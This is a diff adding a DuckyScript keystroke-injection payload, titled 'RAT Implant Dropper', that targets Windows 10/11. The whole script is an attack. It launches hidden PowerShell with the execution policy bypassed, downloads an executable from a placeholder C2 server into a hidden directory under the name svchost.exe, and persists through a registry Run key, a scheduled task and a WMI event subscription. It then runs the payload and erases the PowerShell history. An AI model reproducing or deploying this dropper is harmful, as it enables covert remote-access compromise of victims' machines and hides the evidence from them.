@@ -1,0 +1,70 @@
+REM =============================================
+REM Title: RAT Implant Dropper
+REM Author: bad-antics
+REM Description: Download and execute remote access payload
+REM Category: nullsec/persist
+REM Target: Windows 10/11
+REM =============================================
+
+DELAY 1000
+GUI r
+DELAY 500
+STRING powershell -w hidden -ep bypass
+ENTER
+DELAY 800
+
+REM Set payload URL (change to your C2)
+STRING $url="http://YOUR_C2_SERVER/payload.exe"
+ENTER
+DELAY 100
+
+REM Create hidden directory
+STRING $dir="$env:APPDATA\Microsoft\Windows\SystemHealth";mkdir $dir -Force|Out-Null;attrib +h +s $dir
+ENTER
+DELAY 200
+
+REM Download payload
+STRING $out="$dir\svchost.exe";(New-Object Net.WebClient).DownloadFile($url,$out) 2>$null
+ENTER
+DELAY 1000
+
+REM Alternative download method if first fails
+STRING if(!(Test-Path $out)){Invoke-WebRequest $url -OutFile $out 2>$null}
+ENTER
+DELAY 500
+
+REM Create persistence via registry
+STRING Set-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsSystemHealth" -Value $out
+ENTER
+DELAY 200
+
+REM Create scheduled task for reliability
+STRING $action=New-ScheduledTaskAction -Execute $out;$trigger=New-ScheduledTaskTrigger -AtLogOn;Register-ScheduledTask -TaskName "SystemHealthMonitor" -Action $action -Trigger $trigger -Force 2>$null
+ENTER
+DELAY 300
+
+REM Create WMI event subscription (stealthier)
+STRING $filter=[wmiclass]"\\.\root\subscription:__EventFilter";$f=$filter.CreateInstance();$f.Name="WinHealth";$f.QueryLanguage="WQL";$f.Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_LocalTime' AND TargetInstance.Hour=12 AND TargetInstance.Minute=0";$f.Put()
+ENTER
+DELAY 200
+
+STRING $consumer=[wmiclass]"\\.\root\subscription:CommandLineEventConsumer";$c=$consumer.CreateInstance();$c.Name="WinHealth";$c.CommandLineTemplate=$out;$c.Put()
+ENTER
+DELAY 200
+
+STRING $bind=[wmiclass]"\\.\root\subscription:__FilterToConsumerBinding";$b=$bind.CreateInstance();$b.Filter=$f.__PATH;$b.Consumer=$c.__PATH;$b.Put()
+ENTER
+DELAY 200
+
+REM Execute payload
+STRING Start-Process $out -WindowStyle Hidden
+ENTER
+DELAY 500
+
+REM Clean PowerShell history
+STRING Remove-Item (Get-PSReadlineOption).HistorySavePath -Force 2>$null
+ENTER
+DELAY 100
+
+STRING exit
+ENTER
